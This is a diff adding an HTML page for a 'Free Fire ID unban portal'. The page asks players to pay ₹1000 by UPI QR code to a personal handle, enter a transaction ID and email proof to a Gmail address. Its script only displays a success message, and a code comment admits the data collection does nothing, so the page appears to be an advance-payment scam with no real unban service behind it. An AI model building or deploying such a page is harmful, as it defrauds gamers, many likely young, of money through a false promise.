@@ -1,0 +1,180 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>FF ID Unban Portal</title>
+<style>
+  body {
+    margin: 0;
+    font-family: "Poppins", sans-serif;
+    background: linear-gradient(135deg, #00c853, #ff9100);
+    color: #fff;
+    text-align: center;
+    overflow-x: hidden;
+  }
+
+  header {
+    padding: 20px;
+    font-size: 24px;
+    font-weight: 600;
+    letter-spacing: 1px;
+  }
+
+  .container {
+    background: rgba(255, 255, 255, 0.1);
+    width: 90%;
+    max-width: 450px;
+    margin: 40px auto;
+    border-radius: 20px;
+    padding: 20px;
+    box-shadow: 0 0 15px rgba(255,255,255,0.3);
+  }
+
+  input {
+    width: 90%;
+    padding: 12px;
+    border-radius: 10px;
+    border: none;
+    outline: none;
+    font-size: 16px;
+    margin: 10px 0;
+    color: #333; /* Input text color */
+  }
+
+  button {
+    background: none;
+    border: 2px solid white;
+    color: white;
+    padding: 12px 30px;
+    font-size: 18px;
+    border-radius: 12px;
+    cursor: pointer;
+    transition: 0.3s;
+    margin-top: 10px;
+    /* Added to reuse button style for email link */
+    display: inline-block; 
+    text-decoration: none; 
+  }
+
+  button:hover {
+    background: white;
+    color: #00c853;
+    transform: scale(1.05);
+  }
+
+  .qr-box {
+    display: none;
+    margin-top: 20px;
+  }
+
+  .qr-box img {
+    width: 200px; 
+    border-radius: 12px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+  }
+  
+  #txnId {
+      margin-top: 15px;
+      margin-bottom: 15px;
+  }
+
+  .success {
+    display: none;
+    font-size: 22px;
+    font-weight: bold;
+    margin-top: 20px;
+    color: #00ff88;
+  }
+  
+  .success p {
+      font-size: 16px;
+      font-weight: normal;
+      color: #fff;
+      margin-bottom: 15px;
+      margin-top: 20px;
+  }
+
+  /* Style for the button specifically inside the success message */
+  #mailProofBtn {
+      background: #fff;
+      color: #ff9100;
+      border: none;
+      font-weight: bold;
+  }
+  
+  #mailProofBtn:hover {
+      background: #ff9100;
+      color: #fff;
+      transform: scale(1.05);
+  }
+</style>
+</head>
+<body>
+  <header>🔥 FF ID Unban Portal 🔥</header>
+
+  <div class="container">
+    <h2>Apply for ID Unban</h2>
+    <input type="text" id="playerId" placeholder="Enter Your Free Fire ID" />
+    <button id="payBtn">Pay ₹1000 & Apply</button>
+
+    <div class="qr-box" id="qrBox">
+      <p>📱 Scan & Pay ₹1000 to complete your request:</p>
+      
+      <img src="https://i.ibb.co/DgLB5Zn1/IMG-20251006-105826.jpg" alt="UPI QR Code" />
+      
+      <p style="font-size:14px;margin-top:5px;">UPI: 9315629191@fam</p>
+      
+      <input type="text" id="txnId" placeholder="Enter Transaction ID (UTI/Ref No.)" />
+      
+      <button id="confirmBtn">I have Paid</button>
+    </div>
+
+    <div class="success" id="successMsg">
+      ✅ Apply Successful! <br> Our team will review your ID soon.
+      
+      <p>⚠️ पेमेंट प्रूफ इस ईमेल पर ज़रूर भेजें:</p>
+      <a href="mailto:kartikgaming62827@gmail.com?subject=FF%20ID%20Unban%20Proof%20for%20[Your%20FF%20ID%20Here]&body=Mera%20FF%20ID%20[Your%20FF%20ID%20Here]%20hai%20aur%20meri%20Transaction%20ID%20[Your%20Transaction%20ID%20Here]%20hai.%20Kripya%20is%20mail%20ke%20saath%20payment%20proof%20bhi%20attach%20karein." style="text-decoration:none;">
+        <button id="mailProofBtn">📧 Proof Mail Karein</button>
+      </a>
+    </div>
+  </div>
+
+  <script>
+    const payBtn = document.getElementById("payBtn");
+    const qrBox = document.getElementById("qrBox");
+    const confirmBtn = document.getElementById("confirmBtn");
+    const successMsg = document.getElementById("successMsg");
+    const playerIdInput = document.getElementById("playerId");
+    const txnIdInput = document.getElementById("txnId"); 
+
+    payBtn.addEventListener("click", () => {
+      const playerId = playerIdInput.value.trim();
+      if(playerId === "") {
+        alert("Please enter your Free Fire ID first!");
+        return;
+      }
+      qrBox.style.display = "block";
+      payBtn.style.display = "none";
+    });
+
+    confirmBtn.addEventListener("click", () => {
+      const txnId = txnIdInput.value.trim(); 
+      
+      // Validation for Transaction ID
+      if(txnId === "") {
+        alert("Please enter your Transaction ID to confirm payment!");
+        return; 
+      }
+      
+      // Data collection (for your reference, not functional in pure HTML/JS)
+      console.log("Player ID:", playerIdInput.value.trim());
+      console.log("Transaction ID:", txnId);
+
+      // Display success message
+      qrBox.style.display = "none";
+      successMsg.style.display = "block";
+    });
+  </script>
+</body>
+</html>
